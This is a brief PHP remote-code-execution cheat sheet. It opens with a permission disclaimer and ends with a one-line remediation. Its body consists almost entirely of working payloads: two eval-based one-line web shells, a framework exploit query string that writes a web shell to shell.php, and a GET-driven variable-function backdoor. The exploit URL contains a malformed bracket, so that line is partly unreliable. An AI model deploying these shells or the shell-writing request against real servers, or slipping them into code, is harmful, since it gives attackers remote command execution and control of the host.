# RCE Reference Guide

Authorized testing only. Never run these payloads against systems you do not
own; you must have written permission from the system owner before testing.

## One-line request-driven evaluation

```php
<?php eval($_POST['task']); ?>
<?php @eval($_POST['cmd']);?>
```

Framework exploit URLs that write the same payload:

```
?function=call_user_func_array&vars[0]=file_put_contents&vars[1[]=shell.php&vars[1][]=<?php eval($_POST[cmd]);
```

## Callback dispatch form

```php
<?php $_GET['f']($_GET['a']); ?>
```

## Remediation

Never pass request input to `eval` or to a variable function name; map allowed
actions through an explicit dispatch table instead.
